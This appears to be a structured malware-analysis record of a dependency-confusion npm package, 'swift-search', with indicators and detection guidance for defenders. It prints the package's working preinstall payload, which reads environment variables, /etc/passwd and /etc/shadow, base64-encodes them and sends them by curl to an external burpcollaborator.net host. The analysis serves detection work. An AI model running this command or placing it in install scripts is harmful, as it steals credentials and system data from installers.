package_info.why_malicious: The package was intentionally published to the public npm registry to hijack an internal dependency used by Microsoft (and potentially others) via a dependency confusion attack. Its preinstall script exfiltrates sensitive system information and files to an external server controlled by the researcher, demonstrating clear malicious intent and data exfiltration capability.

malicious_snippets.code_snippet: export HOSTNAME && BCNET="linux-swift-search-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net"; ping -c 1 $BCNET; curl https://$BCNET --ski -m 10 -d "$(env|base64 -w0)"; curl https://$BCNET --ski -m 10 -d "$( { ps aux; cat /proc/version /proc/net/fib_trie /proc/net/if_inet6 /etc/hosts /etc/passwd /etc/shadow 2>&1; } | base64 -w0)" || ping -n 1 windows-swift-search-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true
malicious_snippets.code_behavior: During preinstall, the code collects environment variables, process information, and sensitive files (including /etc/passwd and /etc/shadow), encodes them in base64, and exfiltrates the data via HTTPS POST requests to a researcher-controlled domain, enabling credential and system information theft.

malice_analysis.why_suspicious: The preinstall script performs unauthorized data collection and exfiltration of sensitive system files and environment variables to an external server, which is a hallmark of malicious activity.
malice_analysis.violated_expectations: Normal preinstall scripts may set up dependencies or perform environment checks, but should never access or transmit sensitive files or environment variables to external domains.
malice_analysis.similar_legitimate_use: Legitimate scripts may collect non-sensitive environment data for telemetry (with user consent), but never exfiltrate credentials or system files.
key_indicators: Base64 encoding of environment and process data
Outbound HTTPS requests to non-standard, researcher-controlled domains
Use of preinstall script for data exfiltration

attack_chain.action: Attacker publishes a malicious package named 'swift-search' to the public npm registry, matching the name of an internal dependency used by target projects.
attack_chain.leads_to: Hijacking of dependency resolution in target environments

attack_chain.action: Target project (e.g., Microsoft's Halo dev server) installs the public 'swift-search' package due to dependency confusion.
Malicious preinstall script executes, collecting sensitive system information and files.
attack_chain.leads_to: Exfiltration of data to attacker's server

attack_chain.action: Exfiltrated data is received by the attacker's server, confirming successful compromise and data theft.
attack_chain.leads_to: Attacker gains access to sensitive internal information

behavioral_signatures: Execution of preinstall scripts that access sensitive files (/etc/passwd, /etc/shadow)
Base64 encoding of environment variables and process information in install scripts
Outbound HTTPS or DNS requests to non-corporate, dynamically generated domains during package installation
file_indicators: package.json scripts.preinstall containing curl, base64, or access to /etc/passwd, /etc/shadow
References to burpcollaborator.net or similar external domains in install scripts
network_indicators: HTTPS POST requests to *.burpcollaborator.net or other researcher/attacker-controlled domains
DNS queries for dynamically generated subdomains during package installation
detection_knowledge.how_to_detect: Monitor npm package installations for execution of preinstall scripts that access sensitive files or environment variables and make outbound network requests. Flag any package.json scripts that reference external domains, use base64 encoding, or attempt to access /etc/passwd, /etc/shadow, or similar sensitive files. Correlate installation events with unusual DNS or HTTPS traffic to non-corporate domains.
